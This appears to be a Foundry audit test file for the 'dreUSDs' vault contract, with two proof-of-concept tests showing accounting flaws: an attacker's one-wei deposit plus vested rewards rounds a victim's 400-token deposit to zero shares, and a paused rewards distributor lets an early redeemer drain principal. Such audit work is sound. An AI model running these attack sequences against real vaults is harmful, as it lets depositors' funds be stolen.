// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DreUSDMock} from "../contracts/mocks/DreUSDMock.sol";
import {dreRewardsDistributorMock} from "../contracts/mocks/dreRewardsDistributorMock.sol";
import {dreUSDs} from "../contracts/dreUSDs.sol";

contract AuditDreUSDsRewardsAccountingTest is Test {
    dreUSDs internal vault;
    DreUSDMock internal dreUSD;
    dreRewardsDistributorMock internal rewardsDistributor;

    address internal admin = makeAddr("admin");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    address internal user1 = makeAddr("user1");
    address internal user2 = makeAddr("user2");

    function setUp() public {
        dreUSD = new DreUSDMock();
        dreUSD.grantRole(dreUSD.MANAGER_ROLE(), address(this));

        dreUSDs implementation = new dreUSDs();
        bytes memory initData = abi.encodeWithSelector(dreUSDs.initialize.selector, IERC20(address(dreUSD)), admin);
        vault = dreUSDs(address(new ERC1967Proxy(address(implementation), initData)));

        rewardsDistributor = new dreRewardsDistributorMock(address(dreUSD), address(vault));
        vm.prank(admin);
        vault.setRewardsDistributor(address(rewardsDistributor));

        dreUSD.mint(attacker, 1 ether);
        dreUSD.mint(victim, 1_000 ether);
        dreUSD.mint(user1, 1_000 ether);
        dreUSD.mint(user2, 1_000 ether);
        dreUSD.mint(address(rewardsDistributor), 10_000 ether);

        vm.prank(attacker);
        dreUSD.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        dreUSD.approve(address(vault), type(uint256).max);
        vm.prank(user1);
        dreUSD.approve(address(vault), type(uint256).max);
        vm.prank(user2);
        dreUSD.approve(address(vault), type(uint256).max);
    }

    function testRewardVestingCanZeroOutVictimDepositShares() public {
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(1, attacker);
        assertEq(attackerShares, 1);

        rewardsDistributor.setVestedAmount(1_000 ether);
        rewardsDistributor.setClaimAmount(1_000 ether);

        vm.prank(victim);
        uint256 victimShares = vault.deposit(400 ether, victim);

        assertEq(victimShares, 0);
        assertEq(vault.balanceOf(victim), 0);
        assertEq(dreUSD.balanceOf(victim), 600 ether);
        assertEq(dreUSD.balanceOf(address(vault)), 1_400 ether + 1);
    }

    function testPausedDistributorVestedRewardsLetEarlyRedeemerDrainPrincipal() public {
        vm.prank(user1);
        uint256 user1Shares = vault.deposit(100 ether, user1);
        vm.prank(user2);
        uint256 user2Shares = vault.deposit(100 ether, user2);

        rewardsDistributor.setVestedAmount(200 ether);
        rewardsDistributor.setClaimAmount(200 ether);
        rewardsDistributor.setPaused(true);

        assertEq(vault.totalAssets(), 400 ether);
        assertEq(dreUSD.balanceOf(address(vault)), 200 ether);

        vm.prank(user1);
        uint256 assetsOut = vault.redeem(user1Shares, user1, user1);

        assertGt(assetsOut, 199 ether);
        assertLe(dreUSD.balanceOf(address(vault)), 1);
        assertEq(vault.balanceOf(user2), user2Shares);
        assertEq(vault.maxWithdraw(user2), 200 ether);

        vm.prank(user2);
        vm.expectRevert();
        vault.redeem(user2Shares, user2, user2);
    }
}
